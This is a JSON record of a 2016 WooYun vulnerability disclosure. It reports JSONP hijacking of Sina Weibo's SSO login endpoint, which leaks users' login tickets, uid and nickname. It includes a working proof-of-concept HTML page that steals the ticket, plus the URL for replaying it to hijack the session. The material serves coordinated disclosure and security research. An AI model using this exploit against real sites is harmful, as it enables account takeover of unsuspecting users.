{"id": 87988, "wybug_id": "wooyun-2016-0204941", "wybug_title": "新浪微博之点击我的链接就登录你的微博(JSONP劫持)                                      ", "wybug_corp": "新浪微博", "wybug_author": "loopx9", "wybug_date": "2016-05-04 14:53", "wybug_open_date": "2016-06-22 17:00", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏校验", "设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-05-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-05-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-05-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-22：\t细节向公众公开  简要描述： 打卡。 详细说明：    生活处处有惊喜啊！逛逛wooyun都能捡到bug. 测试的时候没关burp，逛乌云的时候抓到一条url:\nhttp://login.sina.com.cn/sso/login.php?entry=wbwidget&service=miniblog&encoding=UTF-8&gateway=1&returntype=TEXT&from=&callback=sinaSSOController.autoLoginCallBack3&useticket=1&client=ssologin.js(v1.4.2)&_=1462341848253\n当returntype=TEXT时，返回的是jsonp格式：\nsinaSSOController.autoLoginCallBack3({\"retcode\":\"0\",\"ticket\":\"ST-M****M3MQ==-1462342428-xd-D71E5*********D7EB3C15\",\"uid\":\"31******1\",\"nick\":\"xxx\"});\n将ticket，uid，昵称都返回来了。有了ticket之后，利用与 WooYun: 新浪微博之点击我的链接就登录你的微博（XSS敏感域） 一样。替换url中的ticket然后访问就会设置认证cookie：\nhttp://passport.weibo.com/wbsso/login?url=http%3A%2F%2Fweibo.com%2F&ticket=ST-MzE****MQ==-1462341863-xd-7F3B3****8A311A14&retcode=0\n\n\n   漏洞证明：  \n<meta http-equiv=\"Content-Type\" content=\"text/html;charset=UTF-8\"><html><h4><center>weibo jsonp劫持演示</center></h4><body><script>var test = function(obj){alert('uid: ' + obj.uid);alert('nickname: ' + obj.nick);alert('ticket: ' + obj.ticket);}var s=document.createElement('script');s.src='http://login.sina.com.cn/sso/login.php?entry=sso&returntype=TEXT&url=http%3A%2F%2Fweibo.com%2F&gateway=1&savestate=999&callback=test&_rand='+Math.random();document.body.appendChild(s);</script></body></html>\n登录状态访问：\nhttp://pysandbox.sinaapp.com/kv?act=get&k=weibo_jsonp\n   修复方案：  .   版权声明：转载请注明来源 loopx9@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2016-05-08 16:59 厂商回复： 感谢关注新浪安全，问题修复中。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-05-04 14:58 |    \t\t布 \t\t\t( 普通白帽子  |\t\t\t        Rank:105 漏洞数:37        | 凡人皆有一死)\t\t \n  6666    \n     2016-05-04 15:30 |    \t\tbyr5ec \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:2        | I'm pursuing all teh time 5h37|_!)\t\t \n  JSONP劫持？应该是获取到了gsid。    \n     2016-05-04 15:33 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:265 漏洞数:33        | 开发真是日了狗了)\t\t \n  6666    \n     2016-05-04 15:37 |    \t\t呆子不开口 \t\t\t( 普通白帽子  |\t\t\t        Rank:408 漏洞数:36        | 求各种兼职)\t\t \n  这两天我在测试一个POC，不会被楼主抓走了吧    \n     2016-05-04 16:17 |    \t\tBrother \t\t\t( 实习白帽子  |\t\t\t        Rank:78 漏洞数:24        )\t\t \n  9哥.666    \n     2016-05-04 17:07 |    \t\tWenR0 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | ...)\t\t \n  关注    \n     2016-05-04 17:42 |    \t\tFreebug \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:39        | 流氓是一种高尚的职业！)\t\t \n  666    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}